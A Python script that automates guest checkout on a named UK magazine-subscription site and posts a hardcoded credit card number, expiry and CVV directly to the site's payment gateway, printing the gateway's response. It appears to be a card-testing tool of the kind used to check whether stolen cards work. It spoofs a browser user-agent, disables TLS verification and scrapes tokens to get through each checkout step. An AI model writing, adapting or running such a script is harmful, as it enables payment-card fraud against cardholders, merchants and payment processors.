import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import httpx
import time
import base64
import random
import re

def capture(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

async def test_r13_inspect():
    cc, month, year, cvv = '4033060047342909', '08', '2028', '667'
    first, last = 'James', 'Smith'
    email = 'james.smith991@gmail.com'

    headers_base = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    async with httpx.AsyncClient(follow_redirects=False, verify=False, timeout=30.0) as session:
        r = await session.get("https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm", headers=headers_base)
        pi = capture(r.text, "prodId=", "&amp") or "66735"
        ps = capture(r.text, "prodSubId=", "&amp") or "8135328"

        head2 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm"}
        await session.get(f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1", headers=head2)

        head3 = {
            **headers_base,
            "Host": "www.isubscribe.co.uk",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.isubscribe.co.uk",
            "referer": f"https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=bill&email={email}",
        }
        post3 = f"itemcount=1&guestcheckout=true&userid=&email={email}&title=Mr.&firstname={first}&lastname={last}&phone=19006318646&company=&street=1+Warwick+Road&suburb=Thames+Ditton&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing&title_1=Mr.&firstname_1={first}&lastname_1={last}&company_1=&street_1=1+Warwick+Road&suburb_1=Thames+Ditton&postcode_1=KT7+0PR&state_1=United+Kingfonm&country_1=United+Kingdom&publisher_post=0&organisations_post=0&isubscribe_terms=1"
        await session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true", headers=head3, data=post3)

        head4 = {
            **headers_base,
            "Host": "www.isubscribe.co.uk",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay",
        }
        await session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true", headers=head4, data="paymentMethod=creditcard&walletToken=&card=VISA")

        head5 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay"}
        r5 = await session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm", headers=head5)
        ve = capture(r5.text, '"verification" value="', '"')

        head13 = {
            **headers_base,
            "Host": "gateway.pmnts.io",
            "origin": "https://www.isubscribe.co.uk",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://www.isubscribe.co.uk/",
        }
        post13 = f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm&verification={ve}&card_type=VISA&card_number={cc}&card_holder={first}+{last}&expiry_month={month}&expiry_year={year}&cvv={cvv}"
        r13 = await session.post("https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom", headers=head13, data=post13)

        print("r13 Status:", r13.status_code)
        print("r13 Headers:", dict(r13.headers))
        print("r13 Text:", r13.text[:500])

if __name__ == '__main__':
    asyncio.run(test_r13_inspect())
